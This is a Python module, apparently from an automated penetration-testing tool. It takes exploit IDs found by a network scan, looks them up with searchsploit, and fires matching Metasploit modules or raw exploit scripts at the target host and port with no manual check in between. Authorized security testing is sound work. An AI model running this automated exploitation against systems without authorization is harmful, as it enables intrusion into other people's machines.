import os
import re
import shlex
import subprocess
from core.scanning_core.network import NetworkScan

class Exploits:

    def __init__(self):
        self.module = "Exploits"
    
    def searchsploit(self,exp_obj,edb_id,port):
        exp_obj.db_handler.initialize_function(f"Port {port}", exp_obj.scan_type, self.module,scan_subtype="SearchSploit")
        try:
            sp = subprocess.run(
                ['searchsploit', '-p', str(edb_id), '--json'],
                capture_output=True, text=True, check=True
                )
            output= sp.stdout
        except subprocess.CalledProcessError as e:
            print(f"[!] searchsploit failed: {e.stderr.strip()}")
        except Exception as e:
            print(f'[!] Error occured: {e}')
        
        exp_obj.db_handler.store_scan_result(f"Port {port}", output, scan_subtype="SearchSploit")
        return output
        
    def Metasploit(self,exp_obj,output,port):
        exp_obj.db_handler.initialize_function(f"Port {port}", exp_obj.scan_type, self.module,scan_subtype="MetaSploit")
        flag=False
        
        
        msf_match = re.search(r'Metasploit:\s+(.+)', output)
        msf_module = msf_match.group(1).strip() if msf_match else None
        
        if msf_module:
            if exp_obj.mode == "cli":
                print(f"[+] Found Metasploit module {msf_module!r}, launching msfconsole…")
            msf_cmds = [
                f"use {msf_module}",
                f"set RHOSTS {exp_obj.ip}",
                f"set RPORT {port}",
                "set VERBOSE true",
                "run",
                "exit"
            ]
            subprocess.run(
                ['msfconsole', '-x', '; '.join(msf_cmds)],
                check=False
            )
        t = re.search(r'Exploit:\s*(.+)', output)
        if t:
            title = t.group(1).strip()
            print(f"[+] No explicit module – searching msfconsole for title:\n    {title}")
            # build msfconsole commands: search → use 0 → set options → run → exit
            msf_cmds = f"'search {title}; use 0; set RHOSTS {exp_obj.ip}; set RPORT {port}; set VERBOSE true; run; exit -y;'"
            cmd = f'msfconsole -x {msf_cmds}'
            result = []
            # run them all in one -x invocation
            proc = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            try:
                for line in iter(proc.stdout.readline, ''):
                    result.append(line.strip() + "\n")
                    print(line.strip())
                proc.wait()
                if proc.returncode != 0:
                    for line in iter(proc.stderr.readline, ''):
                        print( f"Error: {line.strip()}")
            except Exception as e:
                print( f"Exception: {e}")
            if proc.returncode == 0:
                print("[+] Exploit ran successfully!")
                flag=True
            else:
                print(f"[!] msfconsole returned {proc.returncode}, check output:\n{proc.stderr}")
        exp_obj.db_handler.store_scan_result(f"Port {port}", ''.join(result), scan_subtype="MetaSploit")
        return flag
    
    
    def Script_run(self,exp_obj,output,port):
        exp_obj.db_handler.initialize_function(f"Port {port}", exp_obj.scan_type, self.module,scan_subtype="Script_Run")
        path_match = re.search(r'Path:\s+(.+)', output)
        exploit_path = path_match.group(1).strip() if path_match else None
        
        if not exploit_path or not os.path.exists(exploit_path):
            print(f"[!] Exploit script not found at {exploit_path}")
        
        if not os.access(exploit_path, os.X_OK):
            os.chmod(exploit_path, 0o755)
        
        _, ext = os.path.splitext(exploit_path)
        if ext == '.py':
            cmd = ['python3', exploit_path, exp_obj.ip, str(port)]
        elif ext == '.pl':
            cmd = ['perl', exploit_path, exp_obj.ip, str(port)]
        elif ext == '.rb':
            cmd = ['ruby', exploit_path, exp_obj.ip, str(port)]
        else:
            
            cmd = [exploit_path, exp_obj.ip, str(port)]
        print(f"[+] Executing script: {' '.join(cmd)}")
        
        try:
            subprocess.run(cmd, check=True)
            
        except subprocess.CalledProcessError as e:
            print(f"[!] Exploit script failed: {e}")
        exp_obj.db_handler.store_scan_result(f"Port {port}", output, scan_subtype="Script_Run")

    def network_exploits(self, exp_obj):
        """
        For each port in NetworkScan.get_exploits() dict, runs searchsploit,
        then either:
         - uses a Metasploit module if available, or
         - executes the raw exploit script directly.
        """
        
        # exp_obj.db_handler.initialize_function("Exploits", exp_obj.scan_type, self.module)
        exploits_dict = NetworkScan.get_exploits()
        for port, edb_list in exploits_dict.items():
            for _ ,edb_id in edb_list.items():
                print(f"\n[+] Processing EDB-ID {edb_id} on port {port}")

             
                
                output = self.searchsploit(exp_obj,edb_id,port)
                
                if not self.Metasploit(exp_obj,output,port):
                    self.Script_run(exp_obj,output,port)
        # exp_obj.db_handler.store_scan_result("Exploits",, )
        
                
                

    @staticmethod
    def run_exploits(exp_obj):
        Exploits().network_exploits(exp_obj)
